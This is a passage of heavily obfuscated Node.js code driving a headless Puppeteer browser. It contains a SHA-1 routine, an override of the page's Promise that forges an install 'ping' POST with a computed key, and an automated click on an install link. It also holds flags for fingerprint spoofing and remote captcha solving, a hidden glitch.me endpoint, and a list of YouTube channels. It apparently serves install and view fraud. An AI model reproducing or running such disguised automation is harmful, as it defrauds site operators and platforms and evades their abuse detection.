                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x7fa * 0x3 + 0x66e + -0x1e1c ? (this['block'] = P[-0x11 * 0xc5 + -0x1e21 + -0x3a * -0xbf], this['start'] = N - (0x1dc * 0x1 + -0x2492 + 0x22f6), this['hash'](), this['hashed'] = -0x343 * 0x5 + -0x3ad * -0x3 + -0x1c3 * -0x3) : this['start'] = N;
                }
                return this['bytes'] > 0x9d2c635c + -0x1f7ac8683 + 0xc4bc206 * 0x31 && (this['hBytes'] += this[W(0x15)] / (0x1b69d0f00 + -0x2388 * 0xe29df + 0x140a2ac78) << -0x21f1 * 0x1 + -0x1051 + 0x3242, this['bytes'] = this['bytes'] % (-0x308a3d04 + 0x449066e4 + 0x3904 * 0x42388)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x1 * 0x1f2b + -0x7b * -0x4 + -0x4ba * 0x7;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x163e * 0x1 + -0x1bf5 + -0x3 * -0x1ed] = this['block'], J[K >> -0x1 * -0x5bb + 0x23c5 + -0x297e] |= x[-0x133f + -0x1a40 + 0x2d82 & K], this['block'] = J[-0x18c8 + -0x209 * 0x3 + -0x1 * -0x1ef3], K >= 0x1183 * -0x1 + 0x70 + -0x1 * -0x114b && (this['hashed'] || this['hash'](), J[0x246b + -0x31 * -0x13 + -0x280e] = this['block'], J[-0xb * -0x191 + -0x1d * -0xb3 + 0x1 * -0x2572] = J[0x1e8 * -0x3 + -0x16ec + 0x1ca5] = J[0x151c + 0x1438 + -0x2952] = J[-0x1 * -0xa + -0x152b + 0x1524] = J[-0x227d + 0x269b + -0x41a] = J[-0xe5a * -0x1 + 0x44 * 0x56 + -0x252d * 0x1] = J[-0x284 * -0x2 + -0x28 + -0x36 * 0x17] = J[0x25e + -0x1817 + 0x15c0] = J[0xb4c + -0x1a27 + 0xee3] = J[-0x1c4b * -0x1 + -0x2 * 0x7f + -0x1b44] = J[-0x16 * 0x7a + 0x1 * -0x4a4 + 0xf2a] = J[-0xadd + -0x61 * 0x1f + 0x78d * 0x3] = J[0x1138 + 0x9af + -0x1 * 0x1adb] = J[-0x24d6 + -0x1c5d + 0x4140] = J[-0x157b + -0xcbc + 0x2245] = J[0x10fe + -0x61 * 0x4 + 0xf6b * -0x1] = -0x53 * -0x3e + -0x1dc * 0x11 + -0x3 * -0x3d6), J[-0x553 + -0x148e + -0x19ef * -0x1] = this['hBytes'] << -0xcb6 + -0x3f + 0xcf8 | this['bytes'] >>> 0x476 * -0x6 + 0x1bf * 0x2 + -0x1 * -0x1763, J[-0x2252 + 0x18dc + 0x985] = this['bytes'] << -0x1 * 0x349 + 0xc13 + -0x8c7, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x18f2 + -0x3 * -0xc25 + 0xb * -0x593; J < -0x2606 + -0x4f4 + 0x2b4a; ++J)
                K = Q[J - (0xf7 + -0x229 * -0x12 + 0x27d6 * -0x1)] ^ Q[J - (0x180d + 0x19c * -0x5 + 0x57 * -0x2f)] ^ Q[J - (-0x18dd + 0x10f * 0x8 + -0x1073 * -0x1)] ^ Q[J - (0x2550 + 0x2d7 + -0x3a5 * 0xb)], Q[J] = K << -0x1 * -0x55b + 0x1 * 0x24df + -0x2a39 | K >>> -0x4c2 + 0x3 * 0xca5 + 0x1 * -0x210e;
              for (J = -0x1285 * 0x1 + 0x42f * -0x2 + 0x1 * 0x1ae3; J < 0x248f + 0x10ee + 0x79 * -0x71; J += 0x4 * 0x71d + 0x86d * 0x1 + -0x24dc)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x10f2 + 0xc * 0xa2 + 0x1 * -0x1885 | L >>> 0x427 * 0x4 + -0x24f5 + 0xa3a * 0x2) + (M & N | ~M & O) + P + (-0x152d4f * 0x13f + -0xb1d5a131 + 0x126bb903b) + Q[J] << -0xb87 + -0x1e * 0x58 + -0x1 * -0x15d7) << -0xc * 0x20b + -0x1f * 0x11b + -0x9cd * -0x6 | P >>> 0x8d5 + -0x18dd + 0xf3 * 0x11) + (L & (M = M << 0x110a + 0x17 * -0xfb + 0x5a1 | M >>> 0x13 * -0x1c4 + 0x2207 + -0x79) | ~L & N) + O + (-0x26f5b255 + -0x9a50f504 + 0x11bc920f2) + Q[J + (-0xb3 * -0x35 + 0x138f + -0x389d)] << -0x1 * 0x20d3 + 0x1e11 + 0x2c2) << -0x25 * -0x49 + -0x24cc + 0x1a44 | O >>> 0x58 * -0x6d + 0x1b * -0xbd + 0x3982) + (P & (L = L << 0x552 + 0x7a + -0x5ae | L >>> -0x3b * 0x32 + -0x10ba * 0x2 + 0x2cfc) | ~P & M) + N + (-0x18b9f18d + -0x3097a1bb + 0xa3d40ce1) + Q[J + (-0x5 * 0x507 + -0x217b + 0x430 * 0xe)] << -0x1936 + 0x631 + 0x21d * 0x9) << 0x264a + 0x9ad * 0x4 + -0x23 * 0x233 | N >>> 0xada + 0x1a53 + -0x2512) + (O & (P = P << -0x3b * -0xd + -0x18f8 + 0xf * 0x179 | P >>> 0x1d3b + -0x48a + -0x47 * 0x59) | ~O & L) + M + (-0x9147ba4d + 0x93eb9a9c * -0x1 + 0x17fb5ce82) + Q[J + (0x1 * 0xa97 + -0x19b6 + 0xf22)] << 0x25 * -0x2d + -0x1239 * -0x2 + -0x1df1) << 0xd25 + -0x1 * -0x1715 + -0x2435 | M >>> -0x114 * -0xb + 0x251e + -0x30df * 0x1) + (N & (O = O << -0xe92 + -0x191 * 0x2 + 0x11d2 | O >>> 0x1044 + 0x12b0 + -0x22f2) | ~N & P) + L + (-0x5abf3 * 0x1d96 + 0x7c * 0xc49185 + -0x3a1241 * -0x2cf) + Q[J + (-0x297 * 0x1 + 0x2 * 0x739 + -0xbd7)] << 0x4 * 0x5 + 0x4 * -0x6c7 + 0x1b08, N = N << -0xa * -0x33b + 0x2563 + 0x4593 * -0x1 | N >>> -0x8f * -0x1f + 0x1b73 + -0x2a2 * 0x11;
              for (; J < 0x9 * -0xe6 + -0x232 + -0x1 * -0xa70; J += 0x1f59 + -0x2582 + -0x1 * -0x62e)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x6 * 0x469 + 0x18d * -0xe + 0x4bb * -0x1 | L >>> 0x24 * -0x10b + 0x1 * -0x118d + 0x3734) + (M ^ N ^ O) + P + (-0x7631 * -0x1c0df + -0x6dd321b0 * 0x1 + 0x377 * 0x3e0ee) + Q[J] << 0xa0 * 0x1 + 0x13f9 * 0x1 + -0x1499) << 0x1 * 0x8fd + -0x2c0 + 0x31c * -0x2 | P >>> 0x19ff + 0x3e7 + -0x1d * 0x107) + (L ^ (M = M << 0x1ca0 + -0x1 * 0x1139 + -0xb49 | M >>> 0x1 * -0x1a69 + 0x7e1 + 0x128a) ^ N) + O + (-0x5bc7 * -0xbef4 + -0x1 * 0xcb0cfe6f + 0xf571be64) + Q[J + (0xea9 + -0x26f7 * 0x1 + 0x184f * 0x1)] << -0x25d0 + -0x108e * 0x1 + 0x1 * 0x365e) << -0x37 * -0xad + -0xe2 * -0x17 + -0x3974 | O >>> -0x13e3 + 0x2 * 0xf5b + -0x157 * 0x8) + (P ^ (L = L << -0x9fe * 0x1 + 0x7 * -0x476 + -0x4a * -0x8f | L >>> 0x1110 + 0x234f + -0x345d) ^ M) + N + (0x454e3e59 + 0x5a9b3065 + -0x1 * 0x310f831d) + Q[J + (0x1bb1 * 0x1 + 0x1 * -0x144b + -0x764)] << 0x1 * -0x1096 + -0x1 * -0xe0b + 0x28b) << 0x25ef + -0x23b5 + -0x235 | N >>> 0x66a + -0x1 * 0x2687 + 0x101c * 0x2) + (O ^ (P = P << -0xebb + -0x6 * -0x362 + -0x573 | P >>> -0xee * 0x4 + -0x1 * -0x12b + -0x28f * -0x1) ^ L) + M + (-0xa96c996e + -0x1 * -0x544ad5e4 + -0x1 * -0xc3fbaf2b) + Q[J + (-0x1a66 + 0x3 * 0x5db + -0x2 * -0x46c)] << -0x1 * -0x15a1 + 0x6b * -0x25 + 0x107 * -0x6) << -0x29 * 0x53 + -0x150f + 0x225f | M >>> 0x9bc + 0x10ce * -0x1 + -0xa7 * -0xb) + (N ^ (O = O << 0x35 * 0x7b + 0x275 + 0x2 * -0xde7 | O >>> -0x1f37 + -0x581 + 0x24ba) ^ P) + L + (0x98295e8e + -0xda90c1a2 + -0xb1414eb5 * -0x1) + Q[J + (-0x322 * 0x8 + -0x1069 + 0x13 * 0x22f)] << -0x14dd + 0x1541 * 0x1 + -0x64, N = N << -0x26bc + 0x1 * 0x1bc7 + 0xb13 | N >>> -0x1 * 0x96d + 0x2a2 * 0xd + -0x18cb * 0x1;
              for (; J < -0x1f * -0xd8 + -0x1 * -0x73f + -0x4bd * 0x7; J += 0xd9b + -0x1851 + 0xabb)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1cc6 * 0x1 + 0x1d0d + -0x39ce | L >>> 0xef8 * -0x2 + 0xd90 + 0x1 * 0x107b) + (M & N | M & O | N & O) + P - (0x6edb8e45 + 0x12 * 0x34cbbff + -0x395c830f) + Q[J] << -0x1f98 + 0x5e * 0x37 + 0xb66) << -0x23d * 0xd + 0x4e1 + 0x183d | P >>> 0x516 + -0x153e * -0x1 + -0x1a39) + (L & (M = M << 0x3 * 0xac5 + 0x204 + 0x1 * -0x2235 | M >>> -0x3f1 * 0x7 + 0x1 * 0x8a6 + 0x12f3) | L & N | M & N) + O - (-0x70c4bd1b + -0xd3ef67b1 + 0x7 * 0x3e837c90) + Q[J + (-0x1d84 + -0x71 * -0x1f + 0xfd6)] << 0x35 * -0x1b + -0x138f + 0x3 * 0x862) << -0x86e * 0x4 + 0x18c * 0xc + 0xf2d | O >>> 0x243a * 0x1 + 0x2 * -0xef0 + -0x63f) + (P & (L = L << 0x1f99 + 0x6a * -0x1f + -0x12a5 | L >>> 0xbf0 + -0xa * 0x10c + -0x176) | P & M | L & M) + N - (0x61 * -0x22cca1d + 0x8e6e3fd4 + 0xb56e984d) + Q[J + (-0x1 * 0x2022 + -0x150a + 0x352e)] << -0x22f6 + 0xc * 0x51 + -0x1f2a * -0x1) << 0xb * 0x303 + -0x13ad + -0x1 * 0xd6f | N >>> 0x1 * -0x129e + 0x24fb * -0x1 + 0x37b4) + (O & (P = P << -0x88d + 0x1c4c + -0x13a1 * 0x1 | P >>> 0x234b + -0x1c * 0xc3 + -0xdf5) | O & L | P & L) + M - (-0x197c44ce + -0x8fa15092 + 0x11a01d884 * 0x1) + Q[J + (-0x185a + 0x1870 + -0x13)] << 0xa * -0x79 + 0xb39 + -0x67f) << -0x1f0a + -0x5 * 0x755 + 0x43b8 | M >>> 0x1779 + -0x1 * -0xc8f + -0x23ed) + (N & (O = O << -0x8a6 + 0xa60 + -0xce * 0x2 | O >>> -0x6a6 + 0x632 + 0x76) | N & P | O & P) + L - (-0x351f9fa * 0x2 + 0x3b56e5 * 0x1b + 0x4fe5f * 0x16af) + Q[J + (-0x7ed * -0x1 + 0xe9e + -0x1 * 0x1687)] << -0x3 * 0xa8c + 0x832 * -0x2 + 0x3008, N = N << 0x16b1 + -0x762 + 0x1 * -0xf31 | N >>> 0x83 * -0x11 + -0x7ec + 0x10a1;
              for (; J < 0x2285 + 0x2 * 0x395 + 0x1 * -0x295f; J += 0xf8 * 0x2 + -0xc * -0x107 + -0xe3f)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x18c1 * -0x1 + 0x13e + 0x1788 | L >>> -0x668 + 0x1758 + -0x10d5) + (M ^ N ^ O) + P - (0x1 * -0x1e2b0649 + -0x5df75b1e + 0xb1bf9f91) + Q[J] << 0x974 + 0xd4d + -0x16c1) << 0x9d5 + 0x35f * -0x3 + 0x4d | P >>> 0x1 * 0x3d9 + -0x2ba * 0xb + 0x1a40) + (L ^ (M = M << -0x19c1 + 0x1cc2 + -0x2e3 | M >>> -0x1e * -0xa + 0x3 * 0x565 + -0x1 * 0x1159) ^ N) + O - (0x6453d5d0 + 0x60b78811 * -0x1 + 0x3200f06b) + Q[J + (-0x1e66 + -0x17f3 + 0x3 * 0x121e)] << 0x1416 + 0x1 * -0x1d11 + 0x8fb) << -0x1d4 + 0x9bb + 0x2 * -0x3f1 | O >>> -0x1423 + -0x7c1 * 0x2 + -0xd * -0x2c0) + (P ^ (L = L << 0x17a9 + -0x3b1 + -0xe7 * 0x16 | L >>> -0x3d6 + 0x239b * 0x1 + -0x1fc3) ^ M) + N - (-0x534ff117 + -0x40d * -0xfe336 + 0xd * 0x5950fcf) + Q[J + (-0x14de + -0x1a0 + 0x280 * 0x9)] << 0x15c2 + -0x10b3 + -0x50f) << 0x2472 + 0xad9 + 0xfc2 * -0x3 | N >>> -0x1d1b + 0x253f * 0x1 + -0x809) + (O ^ (P = P << 0x10d * -0x2 + -0x257d + -0x6b * -0x5f | P >>> -0x1552 * 0x1 + 0xa * 0xb5 + 0xe42) ^ L) + M - (0x2b2454ab + -0x28f8d3d2 + 0x3371bd51) + Q[J + (0x9c5 + -0x13 * 0xca + 0x29e * 0x2)] << -0x2bb * 0x8 + 0xb77 * 0x3 + 0x7 * -0x1cb) << 0xf74 + 0x1 * -0x20c5 + 0x1156 | M >>> 0xd * -0x28f + -0x71c + 0x13a * 0x21) + (N ^ (O = O << 0x2 * -0x593 + -0x17f5 + 0x2339 | O >>> -0x10e2 * 0x1 + 0x22a8 * 0x1 + 0x2 * -0x8e2) ^ P) + L - (-0x4ba56 * -0x11b8 + 0x4c20cb93 + -0x6a493139) + Q[J + (0x14a7 + 0x4be * -0x5 + 0x313)] << -0x23 * 0x93 + 0x989 + 0xa90, N = N << -0x1545 * 0x1 + -0xfbe + 0x1 * 0x2521 | N >>> -0x1 * -0xbff + 0x1 * -0x25f1 + 0xb * 0x25c;
              this['h0'] = this['h0'] + L << -0x4b * 0x25 + 0xca + 0xa0d, this['h1'] = this['h1'] + M << -0xe41 + -0x1df4 + 0x2c35 * 0x1, this['h2'] = this['h2'] + N << 0x24df * -0x1 + -0x1fd * -0x1 + 0x1171 * 0x2, this['h3'] = this['h3'] + O << -0x1950 + 0x1faa + -0x65a, this['h4'] = this['h4'] + P << -0x13a5 * 0x1 + -0x1ae7 + -0x4 * -0xba3;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0xdde + 0x19 * 0x3b + -0x1385 & -0x1d62 * 0x1 + -0xbb7 * -0x1 + 0x11ba] + w[J >> -0x35 * 0x4a + 0x2324 + -0x13ba & -0x2 * -0xde2 + -0x2b * 0x47 + -0xfc8] + w[J >> 0xd0d + -0x1ca7 + 0xfae & -0x699 + -0x2225 * 0x1 + -0x5 * -0x829] + w[J >> -0x1296 + 0x1 * -0x90d + 0x1bb3 & -0x4af + 0x4c + 0x472] + w[J >> -0x251b + 0x922 + 0x1 * 0x1c05 & -0x1 * 0x9e3 + 0x114 * 0x20 + -0x188e] + w[J >> 0x19c3 + -0x240e + 0x1 * 0xa53 & -0x1 * -0x196b + 0xd * 0x7f + -0x1fcf] + w[J >> 0x1 * -0x2e1 + -0x1a91 * 0x1 + -0x346 * -0x9 & -0x1 * 0x7e2 + -0x29 * 0x93 + -0xd * -0x26c] + w[-0x240b * -0x1 + 0x1 * 0x84a + -0x2c46 * 0x1 & J] + w[K >> -0x1322 * -0x2 + 0x188c + 0xfad * -0x4 & -0x1a12 + 0x1fec + -0x5cb] + w[K >> 0x1a87 + -0x2ce + -0x1 * 0x17a1 & -0x1 * -0x127e + 0x1787 + -0x29f6] + w[K >> 0x131e + -0x8 * -0xaf + -0x1882 & -0xfb * -0x27 + -0x109b * -0x1 + -0xbb * 0x4b] + w[K >> 0x2298 + -0x3c1 + 0x1 * -0x1ec7 & -0xf2 * 0x13 + -0x8 * 0x334 + 0x2ba5] + w[K >> -0x2589 + 0x1 * 0x186d + -0x1 * -0xd28 & -0x188c + 0x1d * 0x133 + 0x5d * -0x1c] + w[K >> -0x1b53 + -0x879 * 0x2 + 0x1 * 0x2c4d & -0x147 * 0x1 + -0xcc5 + -0x9d * -0x17] + w[K >> -0x9 * -0x87 + 0x22b8 + 0x1 * -0x2773 & 0x492 + 0x282 + -0x705] + w[-0x1 * -0x23c5 + -0x2425 + 0x3 * 0x25 & K] + w[L >> -0x2 * -0x100f + 0xccf + -0x2cd1 & -0x7b6 + 0xbfb + -0x436] + w[L >> 0x18d3 + -0x1 * 0xaf1 + 0xa * -0x161 & -0x1b1e + 0x14c5 + 0x668] + w[L >> 0xac4 + -0xfe8 + 0x538 & 0x2492 + 0x1936 + -0x3db9 * 0x1] + w[L >> -0x2 * -0x11e3 + 0x56e + -0x2924 & 0x58f * 0x5 + 0x1d * 0x67 + 0x5a1 * -0x7] + w[L >> 0x58c + -0x2 * 0xe26 + -0x4 * -0x5b3 & 0x1a * 0xcc + -0x1c80 + 0x7d7] + w[L >> -0x208e + 0x1a4f + 0x647 & 0xb * -0x9f + -0x4ed + -0x5 * -0x25d] + w[L >> 0x3b * 0x8a + 0x3 * 0x2ed + -0x9b * 0x43 & -0x1 * 0x2522 + -0xf4 * 0x1 + -0x15 * -0x1d1] + w[0xee5 + -0x587 * -0x1 + -0x145d & L] + w[M >> 0xb00 + -0x95b + 0x83 * -0x3 & 0x1889 + 0x1d5 * 0x8 + -0x2722] + w[M >> -0x5 * 0x16c + 0x52e + 0x206 & -0x12 * -0x5 + -0x1fdf * 0x1 + 0x1f94] + w[M >> 0x218f + 0x250f + -0x468a & 0x3 * -0xcfb + 0xf * 0x166 + 0x3 * 0x602] + w[M >> 0x132f + 0x5a1 + 0x210 * -0xc & -0x179d + -0x7ea + 0x1f96] + w[M >> 0xf98 + 0xa * 0x1a9 + -0x2026 * 0x1 & 0x7f * 0x17 + 0x905 * 0x1 + -0x145f * 0x1] + w[M >> 0xbe8 + 0x275 + -0x4c7 * 0x3 & -0x1b * -0x89 + -0x2098 + 0x1234] + w[M >> 0x29 * 0x8e + 0x24c6 + 0x880 * -0x7 & -0x130b + -0x5 * 0x6d + 0x5 * 0x43f] + w[-0x2 * -0xe26 + -0x5 * -0x41 + -0x1d82 & M] + w[N >> -0x1d6 * -0xd + -0x25cc + 0xe0a & -0x76d * 0x5 + -0x59 * 0x5b + 0x44d3] + w[N >> 0x204f + 0x4 * -0x54d + -0xb03 * 0x1 & 0x3f * 0x68 + -0x1f7 * 0xb + -0x3ec] + w[N >> 0xe * 0x1a3 + -0xa5b + -0x429 * 0x3 & 0x1 * -0xaf2 + -0x175a + 0x225b] + w[N >> 0x2601 * 0x1 + 0x1 * 0x617 + -0x2c08 & 0x48 * 0x52 + -0x1d78 + 0x677] + w[N >> 0x1434 * -0x1 + -0x38e * -0x1 + 0x1 * 0x10b2 & 0x6 * -0x572 + 0x3b * -0x23 + 0x28cc] + w[N >> -0x21f1 * 0x1 + 0x5 * 0x50b + 0x8c2 & -0xbb0 + 0x1c61 + 0x10a2 * -0x1] + w[N >> 0xe41 + -0x63b + -0x802 & 0xd9a + -0x268b + 0x1900] + w[0xc9a + 0x73e + -0x5 * 0x3f5 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0xf2 * 0xb + -0xd * -0x171 + -0x1d0b & 0x724 + -0x1dca + 0x17a5,
                J >> -0xd2c + -0x1 * -0x179e + 0x1bb * -0x6 & -0x2 * 0xe95 + -0x1869 + -0xaea * -0x5,
                J >> -0x3 * -0x48b + -0x9ad * 0x4 + 0x1 * 0x191b & 0x40 * -0x35 + 0x1dd8 + 0x3 * -0x533,
                0x1749 + -0x127 * 0x10 + -0x3da & J,
                K >> 0x22b4 + 0x31 * 0xb4 + -0x4510 & -0x1f9a + -0x125c + 0x32f5,
                K >> -0x942 + -0x9 * 0x456 + 0x3058 & 0x2242 + -0x243c + 0x2f9,
                K >> 0x1 * 0x12a1 + 0x4 * 0x952 + -0x37e1 & 0x9e8 * -0x3 + 0x2 * 0x853 + 0xe11,
                -0xac9 * 0x3 + -0x1 * 0x1d6e + 0x3ec8 & K,
                L >> 0x22f9 + -0x28 * 0x20 + -0x1 * 0x1de1 & 0x2 * 0x10bf + -0x65 * -0x5b + -0x4466,
                L >> 0xf9a + -0x1 * 0x150a + 0x580 & 0x89c + -0xb6f * 0x3 + 0x1ab0,
                L >> -0x79c + 0x139 * -0x7 + 0x1033 & 0x2f1 * -0x9 + -0x111e + 0xd * 0x36e,
                -0x207d + -0x1 * 0x1693 + 0x380f & L,
                M >> -0x18fb + 0x1 * 0x17d1 + -0x2 * -0xa1 & 0x4 * -0x1db + -0x245c + -0x3 * -0xeed,
                M >> -0x23d1 * -0x1 + 0xcc1 * -0x1 + -0x2e0 * 0x8 & 0x22e2 + -0x3 * -0x252 + 0x1 * -0x28d9,
                M >> -0x893 * 0x2 + -0x4 * -0x72d + -0x5 * 0x24e & 0xb * -0x2d3 + -0x33 * -0x7d + 0x729,
                -0x268b + 0x124 * -0x2 + 0x29d2 & M,
                N >> 0xd5b + -0x1ebd + -0x8bd * -0x2 & -0x1fb4 * -0x1 + -0x1577 + -0x93e,
                N >> -0x13 * -0x209 + -0x94f * 0x1 + -0x5 * 0x5dc & 0x1ff3 * -0x1 + -0x2 * -0x7e4 + 0x152 * 0xd,
                N >> -0x1 * 0x7ed + 0x1 * 0x205d + -0x1868 & 0x26e7 + -0x6 * -0x52a + -0x44e4,
                -0x85f + -0x181f + -0x1 * -0x217d & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x797 * -0x4 + -0xa59 * -0x2 + -0x4df * -0x2), (K = new DataView(J))['setUint32'](0x4 * -0x28f + 0x754 + 0x2e8, this['h0']), K['setUint32'](0x9f * -0x21 + 0x1595 + -0x112 * 0x1, this['h1']), K['setUint32'](0x30 + 0x2658 + -0x2680, this['h2']), K['setUint32'](0xc2 * -0x2c + 0x9 * -0x225 + 0x34b1, this['h3']), K['setUint32'](0xc84 + -0x1237 + 0x5c3, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x3 * -0x435 + -0xee * -0x2 + -0xe7b];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x11 * -0xc5 + -0x543 * -0x4 + -0x7f7;
            J[0x4 * -0x7f5 + -0xc * -0x257 + 0x3c0]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x9c + 0x1 * 0x24fa + -0x2596] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x151f * -0x1 + -0x2621 * 0x1 + 0x3b41), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0xc45 + -0x2358 + 0x1714;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x11 * 0x137 + 0x1 * -0x365 + -0xb66), Promise['resolve'](0x1307 + -0x19ba + -0x3 * -0x23c);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1f07 + -0xce3 * 0x3 + 0x7a2; j < -0xa67 + -0x12d3 + 0x1d3b; j++)
    i();
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0xe7c * 0x1 + -0xa * -0x7 + -0xec2);
    let h = e[f];
    if (c['mhVnID'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x267 + -0x1941 * 0x1 + 0x1ba8, r, s, t = 0xb5 * 0xd + -0x25b3 + -0x1c82 * -0x1; s = m['charAt'](t++); ~s && (r = q % (0x4 * 0x1d5 + -0x1aa4 + 0x1354) ? r * (0x8f7 + 0x105 * 0xb + -0x13ee) + s : s, q++ % (0xf05 * 0x1 + 0x3 * -0xbe1 + -0x2 * -0xa51)) ? o += String['fromCharCode'](-0xc1a * 0x1 + 0x677 + 0x6a2 & r >> (-(-0x7b3 + 0x551 * 0x7 + 0x9d6 * -0x3) * q & 0xa7c + 0xf * 0x22c + -0x2b0a)) : 0xb67 * 0x3 + -0x1 * -0xb92 + -0x2dc7 * 0x1) {
          s = n['indexOf'](s);
        }
        for (let u = 0x19fc + -0x89 * 0x31 + 0x3d, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x1efe + 0x1 * 0x1f6c + -0x3e5a))['slice'](-(0x3d * -0x59 + 0x1378 + 0x1bf));
        }
        return decodeURIComponent(p);
      };
      c['WfECHz'] = i, b = arguments, c['mhVnID'] = !![];
    }
    const j = e[0x1680 + 0x1 * -0x14fc + -0x184],
      k = f + j,
      l = b[k];
    return !l ? (h = c['WfECHz'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
const NETWORK_PATIENCE = 0x4d0 + 0x175f + 0x9d * 0x5 + (0x38c + 0x2 * 0xc3c + -0x104c) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x21ff + -0xac8 + -0x75 * -0x62) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + X(0xc) + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x97b + -0x1 * -0x2583 + 0xf * -0x322; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
